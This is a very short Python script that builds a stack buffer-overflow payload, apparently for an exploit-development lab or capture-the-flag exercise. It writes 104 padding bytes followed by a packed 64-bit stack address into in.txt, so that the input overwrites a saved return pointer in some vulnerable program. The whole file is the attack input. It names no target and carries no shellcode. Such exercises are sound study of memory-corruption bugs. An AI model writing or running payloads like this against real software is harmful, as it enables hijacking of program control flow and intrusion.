#!/usr/bin/python
from struct import *

buf = ""
buf += "A"*104
buf += pack("<Q",0x7fffffffdc40)

f = open("in.txt","w")
f.write(buf)
f.close()

